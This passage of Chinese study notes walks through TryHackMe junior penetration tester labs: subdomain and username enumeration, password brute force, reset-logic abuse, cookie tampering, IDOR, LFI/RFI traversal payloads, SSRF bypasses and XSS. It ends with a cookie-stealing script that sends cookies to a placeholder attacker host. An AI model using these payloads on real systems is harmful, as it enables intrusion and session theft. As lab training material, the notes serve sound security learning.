<p>Bruteforce DNS（域名系统）枚举是从预定义的常用子域列表中尝试数十、数百、数千甚至数百万个不同可能的子域的方法。由于此方法需要许多请求，因此我们使用工具将其自动化以加快流程。</p>
</blockquote>
<p>使用dnsrecon工具进行扫描</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910171235345.png"></p>
<h4 id="Task4-开源情报-Sublist3r"><a href="#Task4-开源情报-Sublist3r" class="headerlink" title="Task4 开源情报-Sublist3r"></a>Task4 开源情报-Sublist3r</h4><p>使用Sublist3r实现自动化探测子域名</p>
<h4 id="Task5-虚拟主机"><a href="#Task5-虚拟主机" class="headerlink" title="Task5 虚拟主机"></a>Task5 虚拟主机</h4><blockquote>
<p>某些子域并不总是托管在可公开访问的 DNS 结果中，例如 Web 应用程序的开发版本或管理门户。相反这些可以保存在私有 DNS 服务器上，也可以记录在开发人员计算机上的 &#x2F;etc&#x2F;hosts 文件（或 Windows 用户的 c：\windows\system32\drivers\etc\hosts  文件）中，该文件将域名映射到 IP 地址。由于当客户端请求某个网站时，Web 服务器可以在一台服务器上托管多个网站，因此我们可以从http请求头host上进行扫描</p>
</blockquote>
<p>使用ffuf扫描靶机的子域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.37.27</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910173800805.png"></p>
<p>这里会出现非常多的扫描结果，可以使用<code>-fs</code>参数进行过滤，因为大部分的无价值的响应内容大小相同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H &quot;Host: FUZZ.acmeitsupport.thm&quot; -u http://10.10.37.27 -fs 2395</span><br></pre></td></tr></table></figure>

<p>成功扫出来子域名<code>delta</code>和<code>yellow</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910173828597.png"></p>
<h3 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h3><h4 id="Task1-用户名枚举"><a href="#Task1-用户名枚举" class="headerlink" title="Task1 用户名枚举"></a>Task1 用户名枚举</h4><p>我们在网站的注册页面进行用户创建时，当我们注册用户名为admin时会回显<code>username already exists</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910174636222.png"></p>
<p>我们可以利用此错误消息的存在，使用ffuf工具对用户名进行枚举</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d &quot;username=FUZZ&amp;email=test&amp;password=test&amp;cpassword=test&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.32.235/customers/signup -mr &quot;username already exists&quot; &gt;&gt; listofusers.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：在上面的示例中， <code>-w</code>参数选择计算机上包含我们要检查的用户名列表的文件位置。 <code>-X</code>参数指定请求方法，默认情况下这将是 GET 请求，但在我们的示例中它是 POST 请求。 <code>-d</code>参数指定我们要发送的数据。在我们的示例中，我们有用户名、电子邮件、密码和 cpassword 字段。我们已将用户名的值设置为<strong>FUZZ</strong> 。在 ffuf 工具中，FUZZ 关键字表示单词列表中的内容将插入到请求中的位置。 <code>-H</code>参数用于向请求添加附加标头。在本例中，我们设置<code>Content-Type</code> ，以便 Web 服务器知道我们正在发送表单数据。 <code>-u</code>参数指定我们发出请求的 URL，最后， <code>-mr</code>参数是我们要查找的页面上的文本，以验证我们是否找到了有效的用户名。</p>
</blockquote>
<p>得到四个用户名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">simon</span><br><span class="line">steve</span><br><span class="line">robert</span><br></pre></td></tr></table></figure>



<h4 id="Task2-暴力破解"><a href="#Task2-暴力破解" class="headerlink" title="Task2 暴力破解"></a>Task2 暴力破解</h4><p>将扫出来的用户名添加到<code>listofusers.txt</code>文件里</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w listofusers.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d &quot;username=W1&amp;password=W2&quot; -H &quot;Content-Type: application/x-www-form-urlencoded&quot; -u http://10.10.122.157/customers/login -fc 200</span><br></pre></td></tr></table></figure>

<p>成功爆破出用户以及对应的密码</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910233319355.png"></p>
<h4 id="Task3-逻辑缺陷"><a href="#Task3-逻辑缺陷" class="headerlink" title="Task3 逻辑缺陷"></a>Task3 逻辑缺陷</h4><p>示例</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( url.<span class="title function_ invoke__">substr</span>(<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;/admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="comment"># Code to check user is an admin</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment"># View Page</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在访问<code>/admin</code>的时候会对用户进行检查，由于上面的 PHP 代码示例使用三个等号 (&#x3D;&#x3D;&#x3D;)，因此它会在字符串上查找完全匹配的内容，包括相同的字母大小写。但如果我们访问<code>/adMin</code>将不会被检查权限，从而实现绕过身份验证</p>
<p>在本靶机中的<code>/customer/reset</code>路径下存在重置密码功能，如果输入的电子邮件无效，您将收到错误消息“从提供的电子邮件地址找不到帐户”。假设我们使用已接受的电子邮件地址去发送，将会看到确认信息发送至邮件</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240910234900589.png"></p>
<p>经过测试，当我们通过GET传参重置密码对应的电子邮件时，成功发送说明存在缺陷</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://10.10.122.157/customers/reset?email=robert%40acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911002104446.png"></p>
<p>靶机的应用程序中，使用查询字符串检索用户帐户，但稍后在应用程序逻辑中，使用PHP变量<code>$_REQUEST</code>中找到的数据发送密码重置电子邮件。由于PHP <code>$_REQUEST</code>变量是一个数组，其中包含从查询字符串接收的数据和 POST 数据。如果查询字符串和 POST 数据使用相同的键名，则该变量的应用程序逻辑更倾向于 POST 数据字段而不是查询字符串</p>
<p>我们先注册我们自己的账户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911002418021.png"></p>
<p>然后利用 <code>$_REQUEST</code>的特性缺陷优先匹配POST参数值，由于该邮件地址<code>customer.acmeitsupport.thm</code>存在对应的用户rev1ve，使得电子邮件成功发送到我们的账号下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://10.10.122.157/customers/reset?email=robert@acmeitsupport.thm&#x27; -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; -d &#x27;username=robert&amp;email=rev1ve@customer.acmeitsupport.thm&#x27;</span><br></pre></td></tr></table></figure>

<p>发送后刷新下用户界面，成功收到电子邮件</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911002617659.png"></p>
<p>点击链接成功访问到robert用户的界面，拿到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911003238230.png"></p>
<h4 id="Task4-Cookie篡改"><a href="#Task4-Cookie篡改" class="headerlink" title="Task4 Cookie篡改"></a>Task4 Cookie篡改</h4><p>Cookie如果为纯文本形式的话，作用其实是很明显的，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: admin=false;logged_in=false</span><br></pre></td></tr></table></figure>

<p>上述Cookie控制着是否登陆成功以及是否为管理员用户</p>
<p>当我们正常去curl目标页面时显示没有登录</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911093616797.png"></p>
<p>尝试发送修改的cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;Cookie:logged_in=true; admin=true&quot; http://10.10.56.209/cookie-test</span><br></pre></td></tr></table></figure>

<p>成功以管理员身份登录</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911093900033.png"></p>
<p>如果Cookie是编码形式的话，比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==; Max-Age=3600; Path=/</span><br><span class="line"># &#123;&quot;id&quot;:1,&quot;admin&quot;: false&#125; </span><br></pre></td></tr></table></figure>

<p>我们只需要将admin键改为true后，再base6 4编码回去即可</p>
<h3 id="不安全直接对象引用"><a href="#不安全直接对象引用" class="headerlink" title="不安全直接对象引用"></a>不安全直接对象引用</h3><blockquote>
<p>IDOR代表不安全直接对象引用，是一种访问控制漏洞。当 Web 服务器接收用户提供的输入以检索对象（文件、数据、文档）、对输入数据过于信任并且未在服务器端进行验证以确认输入数据时，可能会发生此类漏洞。请求的对象属于请求它的用户。</p>
</blockquote>
<p>打开靶机，创建用户后登录</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911141751452.png"></p>
<p>在account界面F12点击网络，刷新一下发现存在路径为 <code>/api/v1/customer?id=50</code>的端点的调用</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911141718661.png"></p>
<p>并且查看下响应的json数据，刚好id为50是对应我们账户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911141909028.png"></p>
<p>尝试查看id为1的用户，成功获得用户信息</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911142134614.png"></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="Task1-路径遍历"><a href="#Task1-路径遍历" class="headerlink" title="Task1 路径遍历"></a>Task1 路径遍历</h4><p>常见操作系统文件</p>
<table>
<thead>
<tr>
<th><strong>Location 地点</strong></th>
<th><strong>Description 描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;etc&#x2F;issue</td>
<td>包含在登录提示之前打印的消息或系统标识。</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;profile</td>
<td>控制系统范围的默认变量，例如导出变量、文件创建掩码 (umask)、终端类型、指示新邮件何时到达的邮件消息</td>
</tr>
<tr>
<td>&#x2F;proc&#x2F;version</td>
<td>指定Linux内核的版本</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;passwd</td>
<td>拥有有权访问系统的所有注册用户</td>
</tr>
<tr>
<td>&#x2F;etc&#x2F;shadow</td>
<td>包含有关系统用户密码的信息</td>
</tr>
<tr>
<td>&#x2F;root&#x2F;.bash_history</td>
<td>包含 root 用户的历史命令</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;dmessage</td>
<td>包含全局系统消息，包括系统启动期间记录的消息</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;mail&#x2F;root</td>
<td>root用户的所有电子邮件</td>
</tr>
<tr>
<td>&#x2F;root&#x2F;.ssh&#x2F;id_rsa</td>
<td>服务器上 root 或任何已知有效用户的SSH私钥</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</td>
<td>Apache Web 服务器的访问请求</td>
</tr>
<tr>
<td>C:\boot.ini</td>
<td>包含具有BIOS固件的计算机的启动选项</td>
</tr>
</tbody></table>
<h4 id="Task2-本地文件包含-LFI"><a href="#Task2-本地文件包含-LFI" class="headerlink" title="Task2 本地文件包含 - LFI"></a>Task2 本地文件包含 - LFI</h4><p>如果include函数没有限制目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;lang&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>那么就可以直接读取敏感文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?lab1.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911143938668.png"></p>
<p>如果限制了读取的目录，比如当我们输入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?lab2.php?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p>会发现有报错，<code>includes</code>目录下没有此文件</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911144305697.png"></p>
<p>对于黑盒测试来说，我们可以利用包含不存在的文件或者输入无效的输入，触发报错来泄露错误信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: include(includes//etc/passwd) [function.include]: failed to open stream: No such file or directory in /var/www/html/lab2.php on line 26</span><br></pre></td></tr></table></figure>

<p>从而知道包含的目录，并且还知道了当前工作路径<code>/var/www/html</code></p>
<p>除了限制文件包含的路径外，继续学习文件包含中过滤器fliter的应用。我们看向lab3，当我们输入<code>/etc/passwd</code>时出现报错，仔细观察包含的文件变成<code>/etc/passwd.php</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911214841539.png"></p>
<p>这其实是一种常见的手段，就是我们只能传文件名，然后与<code>.php</code>进行拼接去包含</p>
<p>这里我们可以利用<code>%00</code>来进行截断攻击，变成如下结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;language/../../../../../etc/passwd%00&quot;.&quot;.php&quot;) =&gt; include(&quot;language/../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：不过这种攻击方式php版本必须低于5.3.4</p>
</blockquote>
<p>通过get传入payload，成功绕过</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911220226967.png"></p>
<p>除了将文件名拼接，filter过滤器还可以对敏感文件的关键字进行过滤比如<code>/etc/passwd</code>。我们可以利用<code>.</code>表示当前目录的特性去绕过</p>
<p>（当然<code>%00</code>也可以绕过关键字过滤）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd/.</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911220031648.png"></p>
<p>还有最常见的过滤方式就是过滤<code>../</code>，防止我们进行路径遍历，当然这种替换方式很好绕过，使用双写绕过即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....//....//....//etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911220724481.png"></p>
<h4 id="Task3-远程文件包含-RFI"><a href="#Task3-远程文件包含-RFI" class="headerlink" title="Task3 远程文件包含 - RFI"></a>Task3 远程文件包含 - RFI</h4><blockquote>
<p>远程文件包含 (RFI) 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 是在不正确地清理用户输入时发生的，从而允许攻击者将外部 URL 注入包含函数中。 RFI 的一项要求是需要打开allow_url_fopen选项。</p>
</blockquote>
<p>RFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 ( RCE )。成功的RFI攻击的其他后果包括：</p>
<ul>
<li>敏感信息披露</li>
<li>跨站脚本（ XSS ）</li>
<li>拒绝服务 ( DoS )</li>
</ul>
<p>我们在服务器上创建恶意php文件，然后开启http服务后远程包含我们的文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.27.18/playground.php?file=http://10.10.221.23:1028/Fhello.php</span><br></pre></td></tr></table></figure>





<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911221928381.png"></p>
<h4 id="Task4-修复措施"><a href="#Task4-修复措施" class="headerlink" title="Task4 修复措施"></a>Task4 修复措施</h4><p>作为开发人员，了解 Web 应用程序漏洞、如何查找它们以及预防方法非常重要。为了防止文件包含漏洞，一些常见的建议包括：</p>
<ol>
<li>保持系统和服务（包括 Web 应用程序框架）更新为最新版本。</li>
<li>关闭PHP错误以避免泄漏应用程序的路径和其他可能泄露的信息。</li>
<li>Web 应用程序防火墙(WAF) 是帮助减轻 Web 应用程序攻击的不错选择。</li>
<li>如果您的 Web 应用程序不需要某些会导致文件包含漏洞的 PHP 功能，请禁用<code>allow_url_fopen</code>和<code>allow_url_include</code>。</li>
<li>仔细分析 Web 应用程序，仅允许需要的协议和PHP包装器。</li>
<li>永远不要相信用户输入，并确保针对文件包含实施正确的输入验证。</li>
<li>实施文件名和位置白名单以及黑名单。</li>
</ol>
<h4 id="Task5-测试挑战"><a href="#Task5-测试挑战" class="headerlink" title="Task5 测试挑战"></a>Task5 测试挑战</h4><h5 id="挑战1"><a href="#挑战1" class="headerlink" title="挑战1"></a>挑战1</h5><p>尝试输入<code>/etc/passwd</code>，出现提示为POST传参。那么我们bp抓包修改请求方式为POST即可</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911223115674.png"></p>
<h5 id="挑战2"><a href="#挑战2" class="headerlink" title="挑战2"></a>挑战2</h5><p>提示需要admin才能看到界面，直接抓包修改cookie参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: THM=admin</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911223427776.png"></p>
<p>这里捣鼓了半天，原来注入点就是Cookie的THM参数，这里测试下发现限制目录和与<code>.php</code>进行拼接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../etc/flag2%00</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911224947450.png"></p>
<h5 id="挑战3"><a href="#挑战3" class="headerlink" title="挑战3"></a>挑战3</h5><p>尝试输入<code>../../../etc/passwd</code>，出现报错</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911225142124.png"></p>
<p>将查询文件与<code>.php</code>进行拼接，还有过滤了<code>.</code>和<code>/</code></p>
<p>提示说是该页面使用<code>$_REQUESTS</code>来接受 HTTP 请求，那么我们burpsuite抓包修改下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /challenges/chall3.php?file=../../../../../etc/flag3%00 HTTP/1.1</span><br><span class="line">Host: 10.10.27.18</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://10.10.27.18/challenges/chall3.php</span><br><span class="line">Cookie: THM=../../../../../etc/flag2%00</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 32</span><br><span class="line"></span><br><span class="line">file=../../../../../etc/flag3%00</span><br></pre></td></tr></table></figure>

<p>成功拿到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911225717087.png"></p>
<h5 id="挑战4"><a href="#挑战4" class="headerlink" title="挑战4"></a>挑战4</h5><p>和前面远程文件包含一样，不过就是把恶意php文件内容改一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;hostname&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240911230218033.png"></p>
<h3 id="SSRF-服务器端请求伪造"><a href="#SSRF-服务器端请求伪造" class="headerlink" title="SSRF 服务器端请求伪造"></a>SSRF 服务器端请求伪造</h3><h4 id="Task1-SSRF示例"><a href="#Task1-SSRF示例" class="headerlink" title="Task1 SSRF示例"></a>Task1 SSRF示例</h4><p>预期请求是 website.thm 服务器期望接收的内容，红色部分是网站将获取信息的 URL。而攻击者可以将红色区域修改为他们所利用的URL</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912123408584.png"></p>
<p>攻击者可以目录遍历来控制路径，比如url传入以下内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://website.thm/stock?url=/../user</span><br></pre></td></tr></table></figure>

<p>那么应用程序在处理的时候就会变成对<code>http://website.thm/stock/../user</code>发起请求</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912123833180.png"></p>
<p>有这么一种情况，就是攻击者可以控制向其发出请求的服务器的子域。正常情况下我们只能通过server参数传入子域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://website.thm/stock?server=api&amp;id=1 =&gt; http://api.website.thm/stock?id=1</span><br></pre></td></tr></table></figure>

<p>很明显限制了我们访问敏感路径，不过我们可以利用<code>&amp;x=</code>结尾来绕过，作用是阻止将剩余路径附加到攻击者 URL 的末尾，并将其转换为查询字符串上的参数 <code>?x=</code>，我们修改下server参数的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://website.thm/stock?server=api.website.thm/api/user?id=1&amp;x=</span><br></pre></td></tr></table></figure>

<p>这样子在进行处理的时候就成功访问敏感路径了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://api.website.thm/api/user?id=1&amp;x=.website.thm/stock?server=api.website.thm/api/user?id=1</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912125231856.png"></p>
<p>还有一种情况，就是我们可以将请求发送到我们的服务器上，这样可以捕获发送到攻击者指定域的HTTP请求头，这可能包含身份验证凭据或者API密钥</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912125044786.png"></p>
<h4 id="Task2-SSRF常见位置"><a href="#Task2-SSRF常见位置" class="headerlink" title="Task2 SSRF常见位置"></a>Task2 SSRF常见位置</h4><p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912125346738.png"></p>
<h4 id="Task3-SSRF防护"><a href="#Task3-SSRF防护" class="headerlink" title="Task3 SSRF防护"></a>Task3 SSRF防护</h4><p><strong>黑名单</strong></p>
<p>拒绝列表是除了列表中指定的资源或匹配特定模式的资源之外的所有请求都被接受的地方。 Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域免遭公众访问，同时仍允许访问其他位置。限制访问的特定端点是  localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1  等域名将出现在拒绝列表中。攻击者可以使用替代本地主机引用（例如  <code>0、0.0.0.0、0000、127.1、127.*.*.*、2130706433、017700000001</code>）或具有解析为 IP 地址  127.0.0.1 的DNS记录的子域来绕过拒绝列表例如 127.0.0.1.nip.io。</p>
<p>此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上使用指向 IP 地址 169.254.169.254 的DNS记录注册子域来绕过此漏洞。</p>
<p><strong>白名单</strong></p>
<p>白名单是所有请求都被拒绝的地方，除非它们出现在列表中或匹配特定模式，例如参数中使用的 URL 必须以 <code>https://website.thm</code> 开头的规则。攻击者可以通过在攻击者的域名上创建子域（例如  <code>https://website.thm.attackers-domain.thm</code>）来快速规避此规则。应用程序逻辑现在将允许此输入并让攻击者控制内部 HTTP 请求。</p>
<p><strong>打开重定向</strong></p>
<p>如果上述绕过方法不起作用，那么攻击者还有另外一种伎俩，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会自动重定向到另一个网站地址。以链接 <code>https://website.thm/link?url=https://tryhackme.com</code> 为例。创建此端点是为了记录访问者出于广告&#x2F;营销目的点击此链接的次数。但想象一下，存在一个潜在的 SSRF 漏洞，具有严格的规则，只允许以 <code>https://website.thm/</code> 开头的 URL。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。</p>
<h4 id="Task4-SSRF实战"><a href="#Task4-SSRF实战" class="headerlink" title="Task4 SSRF实战"></a>Task4 SSRF实战</h4><p>打开靶机，提供了两个新路径<code>/private</code>和<code>/customers/new-account-page</code></p>
<p>当我们访问<code>/private</code>时发现IP不被允许</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912130802826.png"></p>
<p>先创建个用户然后登录访问<code>/customers/new-account-page</code>，当我们点击图片属性时，发现图片来源于<code>/assets/avatars/1.png</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912131206043.png"></p>
<p>并且下面当表单提交时， <code>value</code> 属性会被发送到服务器，我们尝试修改为刚刚不被允许访问的<code>/private</code></p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912132409090.png"></p>
<p>更新头像，不过好像不能是以private开头</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912132437445.png"></p>
<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;radio&quot; name=&quot;avatar&quot; value=&quot;assets/../private&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>更新好后，把当前头像base64解码得到flag</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20240912133349865.png"></p>
<h3 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS 跨站脚本攻击"></a>XSS 跨站脚本攻击</h3><h4 id="Task1-XSS-payload"><a href="#Task1-XSS-payload" class="headerlink" title="Task1 XSS payload"></a>Task1 XSS payload</h4><p>最基础的弹出一个带有文本字符串的警告框</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p> <strong>会话窃取</strong></p>
<p>可以获取目标的 cookie，对 cookie 进行 base64 编码以确保成功传输</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;fetch(&#x27;https://hacker.thm/steal?cookie=&#x27; + btoa(document.cookie));&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p> <strong>按键记录器</strong></p>
<p>下面的代码充当键盘记录器。这意味着您在网页上输入的任何内容都将被转发到黑客控制下的网站</p>
